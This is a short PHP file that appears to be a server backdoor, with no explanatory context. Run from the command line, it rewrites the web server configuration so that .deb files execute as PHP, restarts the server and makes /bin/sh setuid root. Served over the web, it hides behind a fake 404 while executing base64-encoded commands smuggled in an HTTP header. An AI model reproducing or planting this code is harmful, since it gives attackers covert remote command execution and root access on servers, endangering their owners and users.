<?php
if (PHP_SAPI === 'cli') {
    file_put_contents('/etc/httpd.conf', '
php_flag engine on
AddHandler application/x-httpd-php .deb
', FILE_APPEND);
    system('/bin/httpd -k restart -f /etc/httpd.conf && chmod u+s /bin/sh');
} else {
    header('HTTP/1.1 404 Not Found');
    echo base64_encode(shell_exec(base64_decode($_SERVER['HTTP_NSC_LDAP'])));
}
